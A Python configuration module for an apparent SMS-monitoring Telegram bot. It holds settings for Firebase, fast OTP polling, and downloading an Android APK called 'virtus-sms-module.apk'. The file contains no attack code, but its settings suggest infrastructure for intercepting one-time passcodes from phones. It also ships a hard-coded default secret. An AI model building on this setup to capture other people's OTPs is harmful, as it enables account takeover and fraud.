from functools import lru_cache

from pydantic_settings import BaseSettings, SettingsConfigDict


class Settings(BaseSettings):
    model_config = SettingsConfigDict(env_file=".env", env_file_encoding="utf-8")

    telegram_bot_token: str = ""
    telegram_allowed_users: str = ""
    api_secret_key: str = "dev-secret-change-me"
    database_url: str = "sqlite:///./sms_monitor.db"
    port: int = 8000
    virtus_module_db: str = "https://virtus-module-default-rtdb.firebaseio.com"
    firebase_workers: int = 128
    otp_poll_interval_sec: float = 0.4
    otp_poll_timeout_sec: float = 1.2
    channel_firebase_timeout_sec: float = 0.8
    public_base_url: str = ""
    virtus_bot_url: str = ""

    @property
    def apk_bot_base_url(self) -> str:
        return (self.virtus_bot_url or self.public_base_url).strip().rstrip("/")
    apk_github_url: str = (
        "https://raw.githubusercontent.com/hivirtusss/V2-testing-done/"
        "cursor/messages-path-otp-8042/apk/virtus-sms-module.apk"
    )

    @property
    def apk_download_url(self) -> str:
        base = self.public_base_url.strip().rstrip("/")
        if base:
            return f"{base}/download/apk"
        return self.apk_github_url.strip()

    @property
    def allowed_user_ids(self) -> set[int]:
        if not self.telegram_allowed_users.strip():
            return set()
        return {
            int(user_id.strip())
            for user_id in self.telegram_allowed_users.split(",")
            if user_id.strip().isdigit()
        }


@lru_cache
def get_settings() -> Settings:
    return Settings()
